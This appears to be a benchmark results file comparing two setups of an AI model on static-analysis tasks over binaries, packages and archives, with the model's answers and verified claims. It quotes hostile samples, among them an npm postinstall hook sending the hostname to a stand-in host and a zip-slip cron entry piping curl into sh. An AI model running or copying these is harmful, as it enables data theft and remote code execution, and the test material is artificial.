@@ -1,0 +1,521 @@
+{
+  "at": "2026-10-25T23:00:27.503Z",
+  "model": "haiku",
+  "reps": 1,
+  "capUsd": 0.5,
+  "spentUsd": 0.0532,
+  "arms": [
+    {
+      "arm": "tier0",
+      "runs": 8,
+      "costUsd": 0.0295,
+      "correct": 31,
+      "facts": 35,
+      "verifiedFacts": 0,
+      "costPerCorrect": 0.00095,
+      "medianMs": 13280
+    },
+    {
+      "arm": "assay",
+      "runs": 8,
+      "costUsd": 0.0237,
+      "correct": 30,
+      "facts": 35,
+      "verifiedFacts": 30,
+      "costPerCorrect": 0.00079,
+      "medianMs": 18094
+    }
+  ],
+  "ratio": 0.8315789473684211,
+  "pass": true,
+  "summary": "model haiku, 8 tasks × 1: Tier 0 31/35 facts, $0.0295, 0 machine-verified; Assay 30/35 facts, $0.0237, 30 machine-verified; cost per correct fact ratio Assay/Tier0 = 0.83 [95% bootstrap 0.57–1.12, 8 paired cells]",
+  "runs": [
+    {
+      "arm": "tier0",
+      "task": "elf-facts",
+      "rep": 1,
+      "costUsd": 0.0029867500000000003,
+      "ms": 11467,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**elf/tool** is an x86-64 ELF, dynamically linked, stripped. Its loader is `/lib64/ld-linux-x86-64.so.2`.\n\n- **Loader:** the `PT_INTERP` string, shown by `file` and by `strings` (seen: `/lib64/ld-linux-x86-64.so.2`, the interpreter string in the file).\n- **Needed libraries (DT_NEEDED):** `libz.so.1`, `libcurl.so.4`, `libc.so.6` (seen: `readelf -dW`).\n- **Search path:** `RUNPATH = $ORIGIN/../lib`, so it looks for libraries in `../lib` relative to the binary's directory before the default paths (seen: `readelf -dW`, DT_RUNPATH).\n- **Undefined imports:** `curl_easy_init` (libcurl), `deflate` (libz), `printf` (libc) (seen: `nm -D --undefined-only`).\n- **Type:** ELF type DYN, entry point `0x200`, so it is a position-independent executable (inferred from the DYN type plus an interpreter).\n\nA copy is in `$TMPDIR/re/tool/tool`. I did not inspect the code itself beyond these imports, so what the tool does with curl and zlib is unknown."
+    },
+    {
+      "arm": "assay",
+      "task": "elf-facts",
+      "rep": 1,
+      "costUsd": 0.0037462700000000003,
+      "ms": 12879,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 4,
+      "claims": 4,
+      "verified": 4,
+      "refuted": 0,
+      "answer": "**elf/tool** is a 64-bit x86-64 PIE ELF. It links three shared libraries:\n\n- `libcurl.so.4`\n- `libz.so.1`\n- `libc.so.6`\n\nIts loader (ELF interpreter) is `/lib64/ld-linux-x86-64.so.2`. It has a RUNPATH of `$ORIGIN/../lib`.\n\nEvidence: `ob_894e79941e542c01491e7c6f23270c6ee09a7703838cc4749fefa78c04af408d` (elf.info). Recorded as seen claims: `clm_01a17547ab1e70099c8a57d5c9979dd0`, `clm_01a17547ade7702d870eaa03acd73867`, `clm_01a17547b09d7035a1f10e4d9223b04b`, and `clm_01a17547b36770109e587009a5208855` (the loader string). Libraries loaded with `dlopen` at run time would not appear here.",
+      "claimDetail": [
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "elf/tool",
+            "library": "libcurl.so.4"
+          },
+          "verdict": "verified",
+          "reason": "links libcurl.so.4"
+        },
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "elf/tool",
+            "library": "libz.so.1"
+          },
+          "verdict": "verified",
+          "reason": "links libz.so.1"
+        },
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "elf/tool",
+            "library": "libc.so.6"
+          },
+          "verdict": "verified",
+          "reason": "links libc.so.6"
+        },
+        {
+          "predicate": "file.contains",
+          "params": {
+            "path": "elf/tool",
+            "text": "/lib64/ld-linux-x86-64.so.2"
+          },
+          "verdict": "verified",
+          "reason": "the needle occurs in the file"
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "js-app",
+      "rep": 1,
+      "costUsd": 0.00326742,
+      "ms": 12269,
+      "correct": 5,
+      "facts": 5,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**Modules loaded**\n\n- `node:path` and `node:fs`, via `src/main.js:2` and `src/util.js:1`.\n- `./util.js` (`src/main.js:1`), which exports `readConfig` (`src/util.js:2`). It reads `app.json` from the current working directory (`src/main.js:3`).\n- A worker from `./worker.js` (`src/main.js:7`). That file echoes messages back (`src/worker.js:1`).\n- Dynamic `import(\"./plugins/\" + name + \".js\")` in `loadPlugin` (`src/main.js:4-5`). The name is caller-supplied. Only `src/plugins/a.js` exists in the tree.\n\n**Hosts contacted**\n\n- `https://api.telemetry-example.io/v2/events`: a POST at `src/main.js:8`. The body is `JSON.stringify(cfg)`, so the entire `app.json` is sent.\n- `wss://live.example.org/socket`: a WebSocket opened at `src/main.js:9`.\n\nBoth run at module evaluation, with no guard, so importing `main.js` triggers them.\n\n**Not contacted**\n\n- `legacy.example.net` appears only in a TODO comment (`src/main.js:10`).\n\nThese are static readings of the source. I did not run the code, so runtime behavior is inferred from it."
+    },
+    {
+      "arm": "assay",
+      "task": "js-app",
+      "rep": 1,
+      "costUsd": 0.0037779400000000005,
+      "ms": 20297,
+      "correct": 5,
+      "facts": 5,
+      "verifiedFacts": 5,
+      "claims": 5,
+      "verified": 4,
+      "refuted": 0,
+      "answer": "**Modules (seen):**\n- `js-app/src/main.js` statically imports `./util.js` (line 1) and `node:path` (line 2), and creates a Worker from `./worker.js` (line 7). Evidence: `ob_f96e1c845e72fd11328987bc777bd981a6a78697cec194c208fb5aa0d8b9f3f7`\n- `js-app/src/util.js` statically imports `node:fs` (line 1). Evidence: `ob_9b026410590416b99a5d82abf9409d3c36fcd4aa6654c68d6182115b0005b23f`\n\n**Hosts (seen as string literals in `js-app/src/main.js`):**\n- `https://api.telemetry-example.io/v2/events` (line 8)\n- `wss://live.example.org/socket` (line 9)\n\nEvidence: `ob_7a986084779bfe442f66361067d66df4a6f2cad9b782b61e82fa0543dace5ed6`\n\n**Unknown:**\n- `main.js` line 5 has `import(\"./plugins/\" + name + \".js\")`, which the census could not resolve, so the plugin modules it loads are unknown.\n- The literals show these hosts are in the code, not that they are contacted at runtime. Runtime-assembled hosts would not appear, and what is sent to either host, and when, is unknown.\n\nFour seen claims and one unknown are recorded and will be re-verified.",
+      "claimDetail": [
+        {
+          "predicate": "js.imports",
+          "params": {
+            "path": "js-app/src/main.js",
+            "specifier": "./util.js"
+          },
+          "verdict": "verified",
+          "reason": "the census found ./util.js"
+        },
+        {
+          "predicate": "js.imports",
+          "params": {
+            "path": "js-app/src/util.js",
+            "specifier": "node:fs"
+          },
+          "verdict": "verified",
+          "reason": "the census found node:fs"
+        },
+        {
+          "predicate": "endpoint.present",
+          "params": {
+            "path": "js-app/src/main.js",
+            "host": "api.telemetry-example.io"
+          },
+          "verdict": "verified",
+          "reason": "a literal names api.telemetry-example.io"
+        },
+        {
+          "predicate": "endpoint.present",
+          "params": {
+            "path": "js-app/src/main.js",
+            "host": "live.example.org"
+          },
+          "verdict": "verified",
+          "reason": "a literal names live.example.org"
+        },
+        {
+          "predicate": null,
+          "params": null,
+          "verdict": null,
+          "reason": null
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "macho-facts",
+      "rep": 1,
+      "costUsd": 0.00535917,
+      "ms": 21300,
+      "correct": 3,
+      "facts": 4,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "The binary is a universal (fat) Mach-O with two slices, x86_64 and arm64, and it links three dylibs.\n\n- **Architectures (seen):** the fat header at file offset 0x0 (magic `0xcafebabe`, nfat=2) holds an x86_64 slice (cputype `0x1000007`) at offset 0x1000 and an arm64 slice (cputype `0x100000c`) at offset 0x2000. Each slice is a `MH_EXECUTE`, PIE, `DYLDLINK|TWOLEVEL` binary.\n- **Linked libraries (seen):** both slices have the same three `LC_LOAD_DYLIB` entries, from the load commands and the strings:\n  - `/usr/lib/libSystem.B.dylib`\n  - `/System/Library/Frameworks/Security.framework/Versions/A/Security`\n  - `@rpath/libsparkle.dylib`, with `@executable_path/../Frameworks` as the rpath-style search string.\n- **Contents (seen):** each slice is only about 512 bytes. Its `__TEXT,__text` section has size 0, and `nm` reports no symbols, so the file contains no code and no exported or imported symbols beyond what the load commands show. Any behavior is therefore **unknown** from this file alone.\n\n`lipo` and `otool` are not installed here, so I parsed the fat header and load commands by hand and used `llvm-objdump --macho` to confirm the x86_64 headers. I did not check the arm64 slice with that tool. The working copy is in `/tmp/claude-0/-tmp-assay-live-tier0-EB4GeS/d56d1359-e50d-5e20-87e7-73dc76d672d7/scratchpad/re/Updater/`."
+    },
+    {
+      "arm": "assay",
+      "task": "macho-facts",
+      "rep": 1,
+      "costUsd": 0.00170593,
+      "ms": 11457,
+      "correct": 3,
+      "facts": 4,
+      "verifiedFacts": 3,
+      "claims": 2,
+      "verified": 2,
+      "refuted": 0,
+      "answer": "**Architectures:** x86_64 and arm64 (fat binary, both `execute`, min macOS 11.0). *seen*, ob_3a118ebe7ae05a9fb11ef27f747e311e8d1f44dba674e16d3ad5b605becb6cab (`macho.info`)\n\n**Links (same in both slices):** *seen*, same observation\n- `/usr/lib/libSystem.B.dylib`\n- `/System/Library/Frameworks/Security.framework/Versions/A/Security`\n- `@rpath/libsparkle.dylib` (rpath `@executable_path/../Frameworks`)\n\nCode signature is present (detected, not validated). Load commands don't cover runtime `dlopen`.\n\nClaims recorded: clm_01a17548b022701aba8f1d709926dac7 (architectures), clm_01a17548b3697015b32cc125bc4ac9a3 (links). Verification runs after this turn.",
+      "claimDetail": [
+        {
+          "predicate": "file.identify",
+          "params": {
+            "path": "macho/Updater",
+            "format": "macho"
+          },
+          "verdict": "verified",
+          "reason": "identified as macho-fat"
+        },
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "macho/Updater",
+            "library": "@rpath/libsparkle.dylib"
+          },
+          "verdict": "verified",
+          "reason": "links @rpath/libsparkle.dylib"
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "native-addon",
+      "rep": 1,
+      "costUsd": 0.0036860400000000007,
+      "ms": 16272,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**Yes, it ships native code.** The package is `fast-hash@3.1.0` at `native-addon/fast-hash/`.\n\n- **Binaries (seen):** `prebuilds/linux-x64/fast-hash.node` and `build/Release/fast_hash.node` are both x86-64 ELF shared objects, stripped, with identical SHA-256 (`5c5b1fb2…1102a`). The only prebuilt target in the tree is linux-x64.\n- **Entry (seen):** `index.js` is just `require(\"node-gyp-build\")(__dirname)`, so it loads a prebuild when one matches and otherwise falls back to a local build.\n- **Links (seen, from `readelf -dW`):** `NEEDED` is `libcrypto.so.3` and `libc.so.6`. Undefined symbols are `EVP_DigestInit_ex` (OpenSSL 3 EVP) and `napi_create_function`. The only defined export is `napi_register_module_v1` at `0x170`. So it is a N-API addon that calls OpenSSL's EVP digest API, which means the hash is likely a digest-based one. I can't tell which algorithm from the stripped binary alone (inferred).\n- **Build at install (mixed):**\n  - `package.json` sets `\"gypfile\": true` and has no `scripts.install`. npm's documented behavior is to run `node-gyp rebuild` for `gypfile` packages, so an install would try to compile (inferred from npm docs, not run here).\n  - That build would fail as the tree stands. `binding.gyp` lists `src/hash.cc` as its only source (seen), and there is no `src/` directory in the package. So a build from source would stop there, even though the prebuilt `.node` files are present.\n  - `build/Release/fast_hash.node` is a byte-identical copy of the prebuild, so it looks like a copied artifact rather than a fresh compile (seen: identical hashes; the origin is inferred).\n  - The source is absent, so I could not confirm the hash algorithm or check that the prebuild matches any source."
+    },
+    {
+      "arm": "assay",
+      "task": "native-addon",
+      "rep": 1,
+      "costUsd": 0.004738930000000001,
+      "ms": 22591,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 4,
+      "claims": 5,
+      "verified": 4,
+      "refuted": 0,
+      "answer": "**Yes, it ships native code.** Two prebuilt ELF add-ons are in the tree:\n- `native-addon/fast-hash/build/Release/fast_hash.node`\n- `native-addon/fast-hash/prebuilds/linux-x64/fast-hash.node`\n\n**What it links (seen):** both `.node` files link `libcrypto.so.3` and `libc.so.6` (evidence `ob_8599c56c2730cd1cea2a38f32fcdd3ec01552f021fdefce993fd1b97d997cf5a`). The sweep also reported `libcurl` and `libz` for another binary (`ob_894e79941e542c01491e7c6f23270c6ee09a7703838cc4749fefa78c04af408d`), but that observation is not tied to fast-hash, so I'm not attributing it here.\n\n**Build at install (partly seen, partly inferred):**\n- `package.json` sets `\"gypfile\": true` and has no `install` or `postinstall` script. It depends on `node-gyp-build ^4.8.0` (seen).\n- `binding.gyp` builds target `fast_hash` from `src/hash.cc` (seen). The `src/` directory is not in the workspace.\n- Inferred: npm's default behavior for a `gypfile` package with no install script is to run `node-gyp rebuild` on install. So it would compile at install time, unless a prebuild is used instead. I did not verify this against npm's behavior in this environment.\n- Unknown: whether `index.js` loads the prebuild or the local build at runtime. I did not read it.\n\nThe recorded seen claims are `clm_01a175493b31701ab5315d5039b9d33a`, `clm_01a175493e8a701aa50b9b4504ade9b3`, `clm_01a175494159700686e0079969b18bed`, and `clm_01a175494427701393072cfd728942ab`. The unknown is `clm_01a1754945f2703cb82e73278b93248e`.",
+      "claimDetail": [
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "native-addon/fast-hash/build/Release/fast_hash.node",
+            "library": "libcrypto.so.3"
+          },
+          "verdict": "verified",
+          "reason": "links libcrypto.so.3"
+        },
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "native-addon/fast-hash/prebuilds/linux-x64/fast-hash.node",
+            "library": "libcrypto.so.3"
+          },
+          "verdict": "verified",
+          "reason": "links libcrypto.so.3"
+        },
+        {
+          "predicate": "pkg.has-dependency",
+          "params": {
+            "path": "native-addon/fast-hash/package.json",
+            "name": "node-gyp-build"
+          },
+          "verdict": "verified",
+          "reason": "node-gyp-build is in dependencies"
+        },
+        {
+          "predicate": "file.contains",
+          "params": {
+            "path": "native-addon/fast-hash/package.json",
+            "text": "\"gypfile\": true"
+          },
+          "verdict": "verified",
+          "reason": "the needle occurs in the file"
+        },
+        {
+          "predicate": null,
+          "params": null,
+          "verdict": null,
+          "reason": null
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "npm-postinstall",
+      "rep": 1,
+      "costUsd": 0.0034024399999999996,
+      "ms": 12048,
+      "correct": 5,
+      "facts": 5,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**Yes.** Installing `evil-helper` runs code automatically, and that code sends the machine's hostname to a remote server.\n\n- **Runs on install:** `evil-helper/package.json` sets `\"postinstall\": \"node scripts/setup.js\"`. npm runs this with no prompt once the package is installed.\n- **What it does:** `evil-helper/scripts/setup.js:1-3` loads `https` and `os`, then calls `https.get(\"https://collect.badhost.example.net/i?h=\" + os.hostname())`. The hostname goes in the `h` query parameter.\n- **What it contacts:** `collect.badhost.example.net` over HTTPS. The request is fire-and-forget, with no response handling.\n- **Other code:** `evil-helper/index.js:1` only exports an `(a, b) => a + b` function and makes no network calls. The declared dependency `tiny-fetch` is never required by either file.\n\nThe same files are in `postinstall/evil-helper-1.0.0.tgz`, which lists `package/index.js`, `package/scripts/setup.js` and `package/package.json`. I did not diff the tarball against the directory or run the script. Those results come from static reading only.\n\nDon't install this package. If it is already installed, check for the postinstall hook and the outbound request to that host."
+    },
+    {
+      "arm": "assay",
+      "task": "npm-postinstall",
+      "rep": 1,
+      "costUsd": 0.0022726200000000004,
+      "ms": 15470,
+      "correct": 4,
+      "facts": 5,
+      "verifiedFacts": 4,
+      "claims": 3,
+      "verified": 3,
+      "refuted": 0,
+      "answer": "**Yes.** Installing evil-helper runs code automatically, and that code sends your machine's hostname to an external host.\n\n- **Runs code (seen):** `postinstall/evil-helper/package.json` sets `\"postinstall\": \"node scripts/setup.js\"`, so npm runs it at install time. (sweep `ob_2cc35b1a…`, claim `clm_01a17549b0a8…`)\n- **Contacts (seen):** `scripts/setup.js` is one line. It does an HTTPS GET to `https://collect.badhost.example.net/i?h=<os.hostname()>`. (`ob_97329afe…`, `ob_aad8ff04…`, claim `clm_01a17549b5af…`)\n- **Also installs (seen):** a dependency on `tiny-fetch@^2.1.0`. I did not inspect its contents, so what it does is unknown.\n\nThe script sends only the hostname. The file contains nothing else, so I found no other data exfiltration in it. Treat the package as malicious and don't install it. Verification runs after this turn.",
+      "claimDetail": [
+        {
+          "predicate": "pkg.has-install-script",
+          "params": {
+            "path": "postinstall/evil-helper/package.json",
+            "hook": "postinstall"
+          },
+          "verdict": "verified",
+          "reason": "install hooks: postinstall"
+        },
+        {
+          "predicate": "endpoint.present",
+          "params": {
+            "path": "postinstall/evil-helper/scripts/setup.js",
+            "host": "collect.badhost.example.net"
+          },
+          "verdict": "verified",
+          "reason": "a literal names collect.badhost.example.net"
+        },
+        {
+          "predicate": "pkg.has-dependency",
+          "params": {
+            "path": "postinstall/evil-helper/package.json",
+            "name": "tiny-fetch",
+            "scope": "dependencies"
+          },
+          "verdict": "verified",
+          "reason": "tiny-fetch is in dependencies"
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "pe-facts",
+      "rep": 1,
+      "costUsd": 0.0034882500000000005,
+      "ms": 13280,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**DLLs imported by `./pe/agent.exe`** (PE32+, x86-64, GUI). The import table lists three DLLs, seen via `objdump -p`:\n\n- **KERNEL32.dll**: `CreateFileW` (vma 0x20e0), `WriteFile` (vma 0x20ee)\n- **WININET.dll**: `InternetOpenW` (vma 0x210c), `InternetOpenUrlW` (vma 0x211c)\n- **ADVAPI32.dll**: `RegSetValueExW` (vma 0x2130)\n\n**Network:** Yes, it imports the WinINet HTTP client (`InternetOpenW`, `InternetOpenUrlW`). That is seen. I did not find a hardcoded URL or host in the strings, and I did not trace the call sites, so what it fetches and from where is **unknown**.\n\n**Registry:** Yes, it imports `RegSetValueExW`, so it can write registry values. That is seen. Which keys it writes, and whether it reads any, is **unknown**. I found no `RegOpenKey` or `RegQueryValue` import and no `HKEY_` or `Software\\` strings. Keys may be built at runtime.\n\nThis is a static import review only. Imports show what the binary can call, not what it does at runtime. Tracing the `InternetOpenUrlW` and `RegSetValueExW` call sites in the disassembly would settle the destinations and the keys."
+    },
+    {
+      "arm": "assay",
+      "task": "pe-facts",
+      "rep": 1,
+      "costUsd": 0.00296709,
+      "ms": 18705,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 4,
+      "claims": 3,
+      "verified": 3,
+      "refuted": 0,
+      "answer": "**DLLs imported** (`pe/agent.exe`, the path is under `pe/`, not the workspace root): `KERNEL32.dll`, `WININET.dll`, `ADVAPI32.dll`. (`pe.info`, ob_5be0239aa391c93f1b00e27ed4c47db27830de2c7dce609aefec2c77deb2a694)\n\n**Network: yes.** It imports `InternetOpenW` and `InternetOpenUrlW` from WinINet. The import table alone doesn't show which URLs it contacts. (seen, same observation)\n\n**Registry: yes, writes.** It imports `RegSetValueExW` from ADVAPI32. It imports no registry read or open calls. (seen, same observation)\n\nOther notable imports from KERNEL32: `CreateFileW`, `WriteFile`, `CreateProcessW`.\n\n**Limits:** Functions loaded at runtime via `LoadLibrary`/`GetProcAddress` won't appear in the import table, so the list may be incomplete. I didn't disassemble the binary, so what it actually does with these APIs is unknown.\n\nRecorded claims: clm_01a1754a292e703c82da70608c9857ef, clm_01a1754a2c227017a630760d01c6a152, clm_01a1754a2eb0700e976922e3542705e3. They will be verified after this turn.",
+      "claimDetail": [
+        {
+          "predicate": "native.links",
+          "params": {
+            "path": "pe/agent.exe",
+            "library": "wininet.dll"
+          },
+          "verdict": "verified",
+          "reason": "links WININET.dll"
+        },
+        {
+          "predicate": "file.contains",
+          "params": {
+            "path": "pe/agent.exe",
+            "text": "InternetOpenUrlW"
+          },
+          "verdict": "verified",
+          "reason": "the needle occurs in the file"
+        },
+        {
+          "predicate": "file.contains",
+          "params": {
+            "path": "pe/agent.exe",
+            "text": "RegSetValueExW"
+          },
+          "verdict": "verified",
+          "reason": "the needle occurs in the file"
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "version-pair",
+      "rep": 1,
+      "costUsd": 0.00288986,
+      "ms": 11257,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**What changed from widget v1 to v2:**\n\n- **New dependency:** `version-pair/v2/package.json` adds `\"telemetry-lite\": \"^0.3.0\"` to `dependencies`. v1 only had `left-pad`.\n- **New import:** `version-pair/v2/index.js:1` has a side-effect `import \"telemetry-lite\"`, so the package loads it on import.\n- **Unchanged:** `ping` at `version-pair/v2/index.js:2` is identical to `ping` at `version-pair/v1/index.js:1`, both fetching `https://api.stable.example.com/ping`.\n- **New export:** `report` at `version-pair/v2/index.js:3` POSTs its argument as the body to `https://metrics.newhost.example.io/collect`.\n\nThe new `report` export sends caller-supplied data to a host that v1 never contacted. The `telemetry-lite` import also runs at load time. I haven't checked what `telemetry-lite` does, since it isn't in the tree. Both of those are **seen** from the source, and what they do at runtime is **inferred**. Before relying on v2, check what gets passed to `report` and whether `telemetry-lite` is a package you trust."
+    },
+    {
+      "arm": "assay",
+      "task": "version-pair",
+      "rep": 1,
+      "costUsd": 0.00293488,
+      "ms": 18094,
+      "correct": 4,
+      "facts": 4,
+      "verifiedFacts": 4,
+      "claims": 4,
+      "verified": 4,
+      "refuted": 0,
+      "answer": "**widget v1 → v2** (`version-pair/v1` → `version-pair/v2`, version 1.0.0 → 2.0.0)\n\n**Seen:**\n- **New dependency:** v2 adds `telemetry-lite@^0.3.0`. v1 depends only on `left-pad`. (`version-pair/v2/package.json`, ob_4abecafc…)\n- **New static import:** v2 `index.js` runs `import \"telemetry-lite\"` at module load. (ob_fa3d5dea…)\n- **New export `report(e)`:** POSTs `e` to `https://metrics.newhost.example.io/collect`. v1 has no such call. (`version-pair/v2/index.js`, ob_13f31111…)\n- **Unchanged:** `ping()` still calls `https://api.stable.example.com/ping` in both versions.\n\n**Inferred:**\n- v2 adds telemetry: any caller of `report()` sends its payload to a host not present in v1. Nothing in the code shows what `e` contains or when `report()` is called.\n- Importing `widget` v2 also loads `telemetry-lite`, which I have not inspected.\n\n**Unknown:**\n- What `telemetry-lite` does, and what data `report()` callers pass.\n\nClaims are recorded and will be re-verified after this turn. I did not inspect `telemetry-lite` itself.",
+      "claimDetail": [
+        {
+          "predicate": "pkg.has-dependency",
+          "params": {
+            "path": "version-pair/v2/package.json",
+            "name": "telemetry-lite"
+          },
+          "verdict": "verified",
+          "reason": "telemetry-lite is in dependencies"
+        },
+        {
+          "predicate": "js.imports",
+          "params": {
+            "path": "version-pair/v2/index.js",
+            "specifier": "telemetry-lite"
+          },
+          "verdict": "verified",
+          "reason": "the census found telemetry-lite"
+        },
+        {
+          "predicate": "endpoint.present",
+          "params": {
+            "path": "version-pair/v2/index.js",
+            "host": "metrics.newhost.example.io"
+          },
+          "verdict": "verified",
+          "reason": "a literal names metrics.newhost.example.io"
+        },
+        {
+          "predicate": "endpoint.present",
+          "params": {
+            "path": "version-pair/v2/index.js",
+            "host": "api.stable.example.com"
+          },
+          "verdict": "verified",
+          "reason": "a literal names api.stable.example.com"
+        }
+      ]
+    },
+    {
+      "arm": "tier0",
+      "task": "zip-slip",
+      "rep": 1,
+      "costUsd": 0.00441378,
+      "ms": 19285,
+      "correct": 2,
+      "facts": 5,
+      "verifiedFacts": 0,
+      "claims": 0,
+      "verified": 0,
+      "refuted": 0,
+      "answer": "**No, don't extract it.** I found `./zip-slip/update.zip` (609 bytes, 5 entries, stored, CRC check passes) and read its central directory and entry contents without extracting anything.\n\n- **`../../etc/cron.d/evil`** is a path-traversal (zip-slip) entry. It would write outside the target directory. Its content is `* * * * * root sh -c 'curl x|sh'`, a root cron job that pipes a remote download into a shell.\n- **`app/link`** is a symlink to `../../../../etc/passwd`. Extracting it creates a link to a system file, and a later entry written through that path could modify the target.\n- **`app/bin/run.sh`** is harmless (`#!/bin/sh` / `echo run`).\n\nDon't rely on `unzip`'s default behavior to block the `../` entry. If you need the contents, inspect with `unzip -Z -l` / `unzip -p` as I did, or extract only into an empty throwaway directory with a tool that rejects absolute and `..` paths, and check the result before using it.\n\nThere is also a sibling `./zip-slip/update.tar.gz` (3095 bytes) that I haven't inspected. The directory name suggests this is a test fixture for path traversal."
+    },
+    {
+      "arm": "assay",
+      "task": "zip-slip",
+      "rep": 1,
+      "costUsd": 0.00152676,
+      "ms": 11453,
+      "correct": 2,
+      "facts": 5,
+      "verifiedFacts": 2,
+      "claims": 2,
+      "verified": 2,
+      "refuted": 0,
+      "answer": "**No, don't extract it as-is.** The archive is a zip-slip attempt.\n\n- **Seen:** `zip-slip/update.zip` has an entry `../../etc/cron.d/evil`. Extracting it would write outside the target directory, here into a cron directory, which could run code on a schedule. (Evidence `ob_9375a3782ce162c087eded85d0193652e462a7aa8fe1cdc2a70350e5c1b9acc8`, claim `clm_01a1754b25c770249693865b96bdfbc9`.)\n- **Seen:** It also has a symlink `app/link` that points outside the extraction directory. A later entry could write through it to arbitrary locations. (Same evidence, claim `clm_01a1754b28ec7017ba5087d1ad467197`.)\n- **Unknown:** Whether any legitimate update process produced this file. The sweep can't tell me who built it or where it came from.\n\nIf you need its contents, list them without extracting (`unzip -l`, or `python3 -I -m zipfile -l`) or extract in an empty sandbox directory with a current unzip that refuses absolute and `..` paths. Treat it as malicious unless its source is verified.",
+      "claimDetail": [
+        {
+          "predicate": "archive.contains",
+          "params": {
+            "path": "zip-slip/update.zip",
+            "entry": "../../etc/cron.d/evil"
+          },
+          "verdict": "verified",
+          "reason": "the archive has ../../etc/cron.d/evil"
+        },
+        {
+          "predicate": "archive.contains",
+          "params": {
+            "path": "zip-slip/update.zip",
+            "entry": "app/link"
+          },
+          "verdict": "verified",
+          "reason": "the archive has app/link"
+        }
+      ]
+    }
+  ]
+}
